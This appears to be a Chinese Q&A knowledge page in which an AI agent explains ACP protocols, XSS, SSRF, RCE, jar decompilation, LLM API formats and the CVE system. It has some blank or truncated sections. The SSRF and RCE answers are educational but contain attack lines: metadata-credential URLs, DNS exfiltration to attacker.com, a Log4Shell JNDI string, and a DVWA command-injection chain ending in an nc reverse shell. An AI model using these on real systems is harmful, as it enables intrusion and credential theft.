ACP 的三种含义与实现生态

2026-11-17
ACPAgent Client ProtocolAgent 互操作ZedSDK
Q12026-11-17龙老板 · 提问

ACP 是什么？AI 圈默认指哪一个？

Agent · 回答要点
  • ACP 在 AI 圈有三种含义，日常语境默认指第一种：
  • Agent Client Protocol（Zed 发起，最常用）：编码 Agent 与编辑器/客户端走 JSON-RPC over stdio 通信，一个 Agent 接入后可被任意客户端调用——类比 LSP 之于代码补全
  • Agent Communication Protocol（IBM/BeeAI 捐给 Linux 基金会）：Agent 之间的互操作协议，概念上已被 Google A2A 吸收
  • Agent Context Protocol（AGNTCY/Cisco）：多 Agent 协作时的上下文与任务状态共享，概念同样被 A2A 吸收
  • 一句话：ACP 管「客户端怎么用 Agent」，A2A 管「Agent 之间怎么配合」

市面上常见的第三方实现有哪些？

XSS（跨站脚本）的原理、注入点与防御

2026-11-17 · 更新于 2026-11-18
XSS跨站脚本注入点油猴对比CSP
Q12026-11-17龙老板 · 提问

XSS 是什么？有哪几种类型？危害和防御怎么做？

Agent · 回答要点
  • 本质：攻击者把恶意 JavaScript 注入到你信任的页面里执行，等于借你的登录态干坏事——「在你家客厅安了他的摄像头」
  • 三种类型：
    • 存储型：恶意脚本写进数据库（评论区、昵称、签名、私信），谁访问谁中招，危害最大
    • 反射型：脚本藏在 URL 参数里，骗你点链接才触发
    • DOM 型：前端 JS 直接把用户输入塞进 innerHTML，不经过后端
  • 危害：盗 Cookie/登录态、冒充操作、钓鱼、挖矿、蠕虫式传播
  • 防御：输入转义、输出编码、CSP 策略、HttpOnly Cookie、富文本白名单过滤
  • 一句话对比：XSS 打的是浏览器和用户，SSRF 打的是服务器和内网——后者危害层级更高
Q22026-11-18龙老板 · 提问

XSS 的注入点在网页端哪些位置？它和油猴插件的机制一样吗？

Agent · 回答要点
  • 先纠正一个常见误解：注入点不是写进网站的 JS 文件，而是「输入被当成代码执行的地方」——网站把提交的数据原样输出到页面，就是漏洞
  • 六个常见入口：
    • URL 参数 / 哈希：?q=&lt;script&gt;…、#&lt;img onerror=…&gt; → 反射型、DOM 型
    • 表单输入存库：昵称、评论、签名、头像描述、私信 → 存储型（一次注入全体中招，最值钱）
    • HTTP 头：User-Agent、Referer（日志后台展示时触发）
    • DOM 汇点：前端把数据塞进 innerHTML、document.write、eval、setTimeout(字符串)
    • 文件上传：SVG、HTML 文件被直接打开
    • 富文本编辑器：过滤不严的 markdown/HTML 渲染
  • 和油猴（Tampermonkey）的区别：
    • 相似点：都是「让一段 JS 在网页里跑」
    • 本质不同：油猴是用户自己装的浏览器扩展，脚本由用户授权运行，属于合法功能；XSS 是攻击者借漏洞把代码塞进别人的页面，受害者不知情时以该网站的身份执行——偷 Cookie、冒充操作、改页面钓鱼
  • 一句话：油猴是正门进来的访客，XSS 是顺没关好的窗户爬进来的小偷

SSRF（服务端请求伪造）的原理、攻击前提、应用场景与防御

2026-11-17 · 更新于 2026-11-19
SSRF服务端请求伪造云元数据盲打外带Capital One
Q12026-11-17龙老板 · 提问

SSRF 是什么？没懂，举个例子

Agent · 回答要点
  • 一句话：攻击者让服务器替他去访问内网/内部资源，服务器成了「跳板」
  • 例子：网站有「输入网址，我帮你抓标题」的功能——
    • 正常用法：填 https://example.com → 服务器去访问，返回标题
    • 恶意用法：填 http://127.0.0.1:8080/admin（本机管理台）、http://192.168.1.1/（路由器后台）、http://169.254.169.254（云元数据密钥接口）
  • 攻击者借服务器的内网身份，看到了公司内网里本不该外露的服务
  • 关键：防火墙挡的是外网→内网，但服务器自己发的请求拦不住——SSRF 钻的就是这个空子
Q22026-11-17龙老板 · 提问

攻击前提是不是必须有「收 URL 的口子」？最根本是在欺骗吗？

Agent · 回答要点
  • 前提：站点必须有「收用户 URL → 服务端替你去取」的功能（图片抓取、网页预览、webhook 回调、导入链接等）——这是攻击面入口
  • 攻击方式：不直接请求内网，把 URL 传给网站，让服务器替你发请求：
    • http://127.0.0.1:xxxx 打本机其他服务（Redis、数据库管理台、未鉴权内部接口）
    • http://169.254.169.254/ 打云主机元数据，拿 AK/SK 临时凭证
    • 打内网管理系统、打印机、K8s API
  • 「欺骗」的精确说法：不是骗内网服务——它收到的是真实合法的请求，只是发起方被偷换了。骗的是整个信任链：①骗外层网站「这是正常用户请求」；②借用服务器的网络位置（它在内网）和身份（内网服务通常无条件信任来自本机/内网的调用）
  • 一句话：SSRF = 把服务端变成你的代理，去打你本来碰不到的内网
Q32026-11-17龙老板 · 提问

什么需求场景会做「收 URL 替你执行」的功能？

Agent · 回答要点
  • 这种功能非常常见，都是为了让用户方便、省本地操作，五大类：
    • 内容抓取类：网页剪藏（贴链接抓正文存笔记）、RSS/新闻聚合、电商价格监控
    • 富媒体处理类：OG 分享卡片缩略图、图片/视频转存 OSS、网页转 PDF
    • 开发者工具类：Webhook 回调调试、域名/SSL/死链检测、短链 302 跳转
    • AI 场景（现在最多）：联网搜索抓网页总结、RAG 知识库导入 URL 文档——这本身就是 SSRF 面
    • 企业内部：SSO/OAuth 回调、CI/CD 拉仓库
  • 共同点：「目标在用户手里 + 处理在服务器侧」——这不是罕见功能，而是互联网产品的默认基础设施
Q42026-11-18龙老板 · 提问

有真实案例吗？攻击者怎么拿到回传数据？需要先知道内网接口吗？

Agent · 回答要点
  • 真实案例：Capital One（2019，影响 1 亿用户）——攻击者向收 URL 的功能填入 169.254.169.254/latest/meta-data/iam/security-credentials/，服务器请求它等于问「我自己的临时密钥是什么」，拿到 AK/SK 后直接列 S3 桶、拖走数据。整个起点就一个 URL。同类：GitLab SSRF CVE 系列、WordPress pingback 内网探测
  • 「响应发不回攻击者手里」是误解，分两种情况：
    • 非盲 SSRF（能回显）：剪藏工具存正文、链接预览显示标题封面、PDF 生成显示渲染结果——你导入 http://127.0.0.1:8080/admin，网站把内网页面抓下来塞进你的预览框，漏洞网站就是你的镜子
    • 盲 SSRF（不回显）也有外带通道：请求 URL 写成 &lt;数据&gt;.attacker.com，服务器解析 DNS 时，攻击者的域名日志就能看到带数据的子域名——Burp Collaborator 的原理；或用响应时间做端口探测
  • 「需要先知道内部接口吗」——多数不需要：
    • 云元数据、Redis、K8s API 都是默认地址默认路径，背下来就能打
    • 未知接口：让被利用的功能先抓 http://127.0.0.1:端口 扫一遍，或利用回显的报错信息逐步摸索
    • 很多场景根本不用读——只要让服务器替我调一下（往 Redis 灌计划任务、调内部删除接口）本身就是破坏
  • 一句话总结最终目的：偷凭据（元数据 AK/SK）、读内网页面、触发内部操作、当跳板进内网——回显靠漏洞功能本身，不靠内网服务主动外发
  • 防御五件套：URL 白名单、禁内网/回环/元数据地址（含 DNS Rebinding 校验）、限制跳转跟随、出网统一走代理、云上强制 IMDSv2
Q52026-11-19龙老板 · 提问

SSRF 的全称是什么？

Agent · 回答要点
  • SSRF = Server-Side Request Forgery，中文「服务端请求伪造」
  • 拆词看本质：
    • Server-Side（服务端侧）：请求由服务器自己发起，不是攻击者的浏览器——这正是它能碰到内网的原因
    • Request Forgery（请求伪造）：请求本身是合法的，被偷换的是「发起方」
  • 一句话：名字已经概括了攻击本质——让服务端替攻击者发出一个来源被伪造的请求

RCE 的定义、典型案例、代码投放渠道与本地靶场实操

2026-11-18
RCE远程代码执行Log4Shell反序列化DVWA
Q12026-11-18龙老板 · 提问

RCE 是什么意思？

Agent · 回答要点
  • RCE = Remote Code Execution（远程代码执行），也常写作 Remote Command Execution（远程命令执行）
  • 攻击者无需物理接触或登录目标系统，通过网络（Web 接口、服务端口）在目标机器上执行任意代码或系统命令
  • 属于高危漏洞类型（典型如 Log4Shell、Struts2 系列），常直接导致服务器被完全控制
Q22026-11-18龙老板 · 提问

有哪些典型案例？

Agent · 回答要点
  • 五个最经典案例：
    • Log4Shell（CVE-2021-44228）：Apache Log4j2 的 JNDI 注入，一行日志就能打穿，影响全球海量 Java 应用，被评为「核弹级」
    • Struts2（CVE-2017-5638）：Equifax 因此泄露 1.47 亿人数据，直接经济损失超 7 亿美元
    • EternalBlue（MS17-010）：NSA 泄露的 SMB 漏洞，WannaCry 勒索蠕虫借它横扫 150+ 国家
    • Shellshock（CVE-2014-6271）：Bash 环境变量注入，Web、CGI、路由器通杀
    • Fastjson / Log4j 反序列化系列：国内 Java 生态高频供应链 RCE
  • 共同特征：入口多为「不可信输入 → 解析/反序列化/命令拼接」，危害都是服务器完全沦陷
Q32026-11-18龙老板 · 提问

想本地模拟攻击链路加深理解，怎么做？

Agent · 回答要点
  • 建议走「本地靶场 + 完整链路」，全程合法可控：
  • 靶场三选一：
    • 最快：Docker + Vulhub，Log4Shell、Struts2、Fastjson 一键起复现环境
    • 最经典：Kali + Metasploitable 2，VM 隔离网络
    • 最直观：DVWA 的 Command Injection 模块，攻击面最小
  • 链路五步（以 DVWA 命令注入为例）：
    • ① 侦察：找到输入点（如 ping 测试框）
    • ② 探测：127.0.0.1; whoami、; id 验证存在命令拼接
    • ③ 执行：; cat /etc/passwd 读敏感文件 → 确认 RCE
    • ④ 会话：; nc -e /bin/sh &lt;IP&gt; &lt;端口&gt; 反弹 shell，本地 nc -lvnp 接住
    • ⑤ 后渗透：提权、横向移动、留持久化——看懂这步才明白危害为什么是「服务器完全沦陷」
  • 工具：Burp Suite 改包、netcat 接 shell、Metasploit 半自动利用
  • 对照防御：每步攻击映射一条防御——输入白名单/参数化调用/禁 exec/最小权限/命令审计，这才是加深理解的关键
  • ⚠️ 只在自建隔离环境动手，别碰未授权目标
Q42026-11-18龙老板 · 提问

恶意代码一般通过什么渠道投放到目标机器上？

Agent · 回答要点
  • 先修正一个关键认知：多数 RCE 的「代码」不是一个上传的文件，而是夹在正常请求里、被漏洞组件自己「捞出来」执行——所以才难防
  • 五条主要渠道：
    • ① 请求直接携带（最常见）：HTTP 参数/头/Body 里夹命令或代码片段——DVWA 那个 ping 框，1.1.1.1; whoami 里的 whoami 就是「恶意代码」，走的是合法业务通道，不碰上传功能；命令拼接、SQL 注入进 xp_cmdshell、SSTI 模板注入都是这路
    • ② 文件上传 + 解析：传 webshell（php/jsp）或图片马，再访问触发——最接近「把代码放上去」，前提是有上传点且解析没拦
    • ③ 动态加载/反序列化（最优雅）：Log4Shell 一行日志 ${jndi:ldap://evil/a}，目标程序自己去远程拉字节码加载进内存——代码全程不落盘，纯内存执行；Fastjson 同理，payload 是序列化数据不是「文件」
    • ④ 供应链投毒：恶意 npm/pip/maven 包，install 阶段就执行——代码随依赖「合法」进来
    • ⑤ 公开漏洞 PoC 直接打：不「放」代码，直接调用漏洞的现成利用（Struts2、EternalBlue）
  • 「入口」本质三类：业务输入点、上传/解析点、程序自己往外取东西的点
  • 防御对位：输入白名单、上传隔离、禁动态外联/反序列化、依赖审计

Java jar 包的结构、跨平台原理与反编译还原

2026-11-20
jarclass 字节码JVM反编译CFR
Q12026-11-20龙老板 · 提问

从 jar 包里能解出 Java 源码吗？里面装的都是什么？

Agent · 回答要点
  • 能不能解出源码，取决于 jar 里装的是什么：
    • 最常见是 .class 字节码：拿不到原始 .java，只能反编译成近似源码
    • 打包时带了 -sources.jar 或直接含 .java 文件：本身就是源码，解压即得
    • Kotlin / Scala 编译产物：要用各自专用反编译工具
  • 常用操作：unzip xxx.jar 查看内容；java -jar cfr.jar xxx.jar --outputdir out 批量导出
  • 工具：JD-GUI（图形查看）、CFR / Procyon / Fernflower（命令行与批量）、IntelliJ 自带反编译器
  • 反编译质量：约 80–95% 可读，变量名、注释、部分泛型会丢失；用 ProGuard 等混淆过的代码基本读不了
Q22026-11-20龙老板 · 提问

jar 里起作用的是 class 字节码吗？「一次编译多平台运行」靠的是它吗？

Agent · 回答要点
  • 理解基本正确，两处修正：
    • jar 本质就是一个 zip 压缩包，只负责打包，不提供跨平台能力
    • 真正实现「一次编译、多平台运行」的是 .class 字节码 + JVM：各平台 JVM 把同一份字节码翻译成本机机器码
  • jar 里装的是：.class、资源文件、META-INF/MANIFEST.MF（主类等元信息）、依赖库；是否含源码取决于打包时是否特意放入
  • 结论：jar 通常只有字节码没有源码，要源码只能反编译还原近似代码
  • 实践：用 Maven 发布时可顺手生成 -sources.jar 一起发布，方便他人看源码

BL 解锁（Bootloader 解锁）的含义、前提与影响

Q12026-11-20龙老板 · 提问

BL 解锁是什么意思？和 EDL 刷机是什么关系？

Agent · 回答要点
  • BL 解锁 = Bootloader Unlock（引导程序解锁）：解除引导程序对镜像的签名校验，让手机能通过 fastboot 刷入非官方镜像（第三方 ROM、root、自定义内核）

  • 一句话：BL 解锁 = 开权限（软件层面的锁），EDL = 走底层通道（硬件级刷写）；EDL 刷完整官方包后，一般会把 BL 重新锁上

大模型 API 协议族：OpenAI / Anthropic / Gemini 三种原生方言与兼容层

Q12026-11-20龙老板 · 提问

大模型 API 接口有哪几种协议？各自的接口样式是什么？

Agent · 回答要点
  • 主流协议有 4 个系列 + 1 个历史遗留：
    • OpenAI Chat Completions（POST /v1/chat/completions）：事实标准，绝大多数国内厂商与第三方网关都兼容。请求 {"model":"x","messages":[{"role":"user","content":"hi"}]}，返回 choices[0].message.content；流式在 SSE 中返回 data: {...delta}

    • OpenAI Responses API（POST /v1/responses，2025 年推出）：Chat 的升级替代，统一文本、工具调用、内置工具（web search、file search）与有状态会话；请求体用 input 而非 messages，响应为 output[]，多数厂商尚未跟进
    • Anthropic Messages（POST /v1/messages）：system 是顶层字段而非一条 message；messages 只允许 user 与 assistant；max_tokens 必填；鉴权用 x-api-key + anthropic-version: 2023-06-01；返回 content:[{"type":"text"}]，流式按 content_block_delta 等事件区分
    • Google Gemini（POST /v1beta/models/{model}:generateContent，流式 :streamGenerateContent?alt=sse）：contents:[{"role":"user","parts":[{"text":"hi"}]}]，assistant 角色叫 model，系统提示放 system_instruction，模型名在 URL 路径；key 走 x-goog-api-key 头或 ?key=
  • 其他：Cohere、Mistral、Ollama 有原生接口但生态位小；Bedrock、Vertex 是云厂商包装层，内部仍是上述协议；国内（通义、DeepSeek、豆包、Kimi）基本兼容 OpenAI chat
  • 选型：接多家模型统一走 OpenAI Chat 最省事；要用 Claude 的 thinking 或 prompt caching，必须走 Anthropic 原生接口
Q22026-11-20龙老板 · 提问

Agent · 回答要点

    • OpenAI 是事实标准层：所有想降低接入门槛的厂商都会额外提供 /v1/chat/completions 兼容端点——Gemini 和 Anthropic 自己也有，并非只有小厂才这么做
    • Gemini / Anthropic 的原生协议是「能力完整版」：Gemini 的 parts 多模态、文件引用，Anthropic 的 thinking、prompt caching、原生工具流，在 OpenAI 兼容层上会丢失或被降级

Bedrock 和 Vertex 是什么？

Agent · 回答要点
  • 两者都是模型托管平台（MaaS），不是协议：不自研模型，在模型原生接口外再包一层，加上企业级身份、网络与计费能力

  • 一句话：直连厂商 = 用原生协议、接入方便能力全；走 Bedrock/Vertex = 换合规、网络与统一治理。企业生产走后者，个人与快速原型走前者

OpenAI Completions（/v1/completions）遗留补全接口的字段、响应与适用场景

2026-11-20
CompletionspromptsuffixFIMlogprobs
Q12026-11-20龙老板 · 提问

深度讲一下 OpenAI Completions 协议

Agent · 回答要点
  • 历史位置：2020 年 GPT-3 时代最原始的接口（davinci / curie / babbage / ada → text-davinci-003），范式是「给一段文字，模型往后续写」；2023 年 3 月 Chat Completions 发布后降为兼容层；2024 年初 GPT-3 base 系列退役，目前仍在用的是 gpt-3.5-turbo-instruct 这类 instruct 遗留模型
  • 关键认知：它是遗留协议，不是「旧版本分支」；语义与 chat 完全不同，不是「少了点功能」的关系
  • 请求字段要点：
    • prompt 有四种形态：string、string[]（批量 N 条独立补全）、token[]、token[][]；用数组会按顺序平铺返回 choices
    • suffix：最独特的字段，做中间填空（infilling / FIM）——在 prompt 与 suffix 之间生成内容，代码补全、模板填空全靠它
    • echo：是否回显原始 prompt；做 token 概率分析必须开启，否则拿不到输入的分数
    • logprobs：返回每个 token 的 top-k 对数概率，适合打分、困惑度计算
    • best_of：服务端生成 n 份再选一份返回（其余丢弃），用于提高单次生成质量；常被误读为「多采样」，服务端成本翻倍
    • presence_penalty / frequency_penalty 在续写场景更常用，因为续写容易循环复读
    • 没有 messages、system、tools、tool_choice、response_format、stream_options
  • 响应体：object 是 text_completion（不是 chat.completion），正文在 choices[0].text；finish_reason 常见 stop（命中 stop 串）、length（达到 max_tokens）、content_filter
  • 与 Chat 的本质差异：completions 不自动套 chat template，发什么模型就看到什么（最多加 EOT/BOS）；用 chat 模型去调它，行为会飘
  • 现在还支持谁：OpenAI 官方基本只剩遗留 instruct 模型（用前先查 GET /v1/models）；开源推理栈 vLLM、SGLang、llama.cpp、Ollama、HF TGI 全部保留 /v1/completions 且支持得更认真，本地跑 base 模型做 FIM 补全基本只走这里

大模型 Tool Loop（工具循环）的终止条件、能力层级与常见误区

2026-11-20
tool calltool_callssystem promptloop 终止agent harness
Q12026-11-20龙老板 · 提问

「四个核心能力」是什么？请求里的 system/role 为什么和 Completions 不一样？Loop 是不是没有 tool call 就终止？

Agent · 回答要点
  • 分三个问题拆开：
  • 「四个核心能力」多半是工具清单，不是协议定义
    • 协议层的原生能力只有一个：按 token 生成（包括生成 tool call 的那串 token）
    • read、write 是 agent 运行时包给模型的工具，不是模型能力；常见「四件套」有几派：Agent harness 派（Read / Write / Edit / Bash）、LLM OS 派（读写互联网、读写记忆文件、执行代码、多模态 I/O）、API 能力派（文本生成、tool call、结构化输出、embedding）
    • 第四个最可能是 search、edit 或 code execution，结论不变：它们全是工具，挂在唯一的原生能力外面
  • 你看到的 system / role 请求 ≠ Completions
    • /v1/completions：输入是裸 prompt，没有角色、没有 system
    • /v1/chat/completions：输入是 messages:[{role: system|user|assistant|tool}]，tool call、system、结构化输出全在这里
    • 两者不是新旧版本关系，而是「裸续写」与「对话协议」两套语义
  • Loop 终止条件：核心规则说对了
    • 标准链路：请求 → 返回 tool_calls → 执行工具 → 结果以 role:tool 塞回 messages → 再请求 → 返回普通消息且无 tool_calls（finish_reason=stop / end_turn）→ 终止
    • 生产环境旁路终止：finish_reason=length 或 content_filter、最大迭代次数或工具调用上限、token 与费用预算耗尽、工具报错重试耗尽、人工审批卡点、结构化 done 信号
    • 易错点：content 与 tool_calls 可以同时存在（模型边解释边调工具），只要 tool_calls 非空就继续 loop；Anthropic 侧对应 stop_reason: tool_use（继续）vs end_turn（终止）
  • 一句话：四个能力是框架给的工具清单、不是协议；system/role 属于 Chat Completions；loop 终止 = 没有 tool_calls，生产里再加上限与预算兜底

CVE 漏洞编号体系的定义、分配机制与个人申请路径

2026-11-20
CVEMITRECNANVDCVSS
Q12026-11-20龙老板 · 提问

CVE 漏洞是指什么？

Agent · 回答要点
  • CVE = Common Vulnerabilities and Exposures（通用漏洞披露），一套公开的漏洞编号标准，由 MITRE 维护、NIST 提供支撑
  • 它本身不提供技术细节，只给每个已确认的安全漏洞发一个全球唯一 ID，方便厂商、安全工具与客户用同一编号沟通
  • 格式：CVE-年份-序号，如 CVE-2021-44228（Log4Shell）
  • 作用：统一标识，避免同一漏洞在各处叫法不一
  • 配套：CVSS 评分（0–10 分，7 以上高危）、厂商公告、NVD 数据库
  • 一句话：CVE 是漏洞的「身份证号」，不是漏洞本身，也不是修复方案
Q22026-11-20龙老板 · 提问

厂商发现并公开漏洞后，就会被指定一个编号吗？

Agent · 回答要点
  • 不完全对，有两个偏差：
    • 时间上：编号通常在公开前就申请下来了（负责任披露流程里，厂商或研究者先找 CNA 申请 CVE，再协调公开日期）；公开后才补录属于补救
    • 不是自动的：CVE 需要主动申请，没有「公开即自动分配」的机制；厂商可以只用自己的编号（微软 MSRC、苹果、Red Hat 的 RHSA），或走别的体系（GitHub 的 GHSA、ZDI），这类漏洞可能长期没有 CVE 号；同一个漏洞也可能被不同 CNA 重复分配，之后合并
  • 结论：「有 CVE ≈ 已确认公开漏洞」大致成立，但「公开漏洞 = 必有 CVE」不成立
Q32026-11-20龙老板 · 提问

个人发现的漏洞可以申请 CVE 吗？

Agent · 回答要点
  • 可以，个人研究者完全能申请
  • 主要通道：MITRE 作为「最后的 CNA」（CNA of Last Resort），任何人都能通过 cveform.mitre.org 提交，个人无需公司背景
  • 更快的方式：漏洞在开源项目里时，GitHub 也是 CNA，发 GHSA 时可顺带申请 CVE 号，流程最顺
  • 实操要点：先联系厂商或维护者并给修复窗口（通常 90 天），说明影响版本与复现方式；协调好公开时间再提交申请，避免「未修复先曝光」
  • 常见被拒原因：漏洞不在受影响产品里、属于配置问题或已知设计、厂商已用自家编号且拒绝配合
  • 边界提醒：只在自己有授权的环境里测试，别碰未授权系统
